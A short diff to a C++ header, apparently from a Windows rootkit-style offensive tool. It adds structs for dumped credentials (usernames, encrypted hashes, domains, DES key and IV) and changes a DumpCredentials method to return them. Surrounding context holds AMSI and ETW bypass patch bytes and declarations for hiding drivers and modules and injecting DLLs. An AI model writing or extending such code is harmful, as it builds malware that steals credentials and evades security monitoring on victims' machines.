@@ -8,6 +8,18 @@ inline std::vector<byte> AMSI_BYPASS_PAYLOAD = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0
 inline std::vector<byte> ETW_BYPASS_PAYLOAD = { 0xC3 };
 constexpr SIZE_T MAX_SHELLCODE_PARAMETERS = 3;
 
+struct Credential {
+	std::wstring Username;
+	std::wstring EncryptedHash;
+	std::wstring Domain;
+};
+
+struct CredentialsInformation {
+	std::vector<UCHAR> DesKey;
+	std::vector<UCHAR> Iv;
+	std::vector<Credential> Credentials;
+};
+
 class MemoryHandlerException : public std::runtime_error {
 private:
 	std::string msg;
@@ -21,7 +33,7 @@ public:
 
 class MemoryHandler : public CommandHandler {
 private:
-	IoctlCredentials DumpCredentials();
+	CredentialsInformation DumpCredentials();
 	bool HideDriver(_In_ std::wstring driverPath, _In_ bool hide);
 	bool HideModule(_In_ DWORD pid, _In_ std::wstring modulePath, _In_ bool hide);
 	bool InjectDll(_In_ DWORD pid, _In_ std::string dllPath, _In_ InjectionType injectionType);
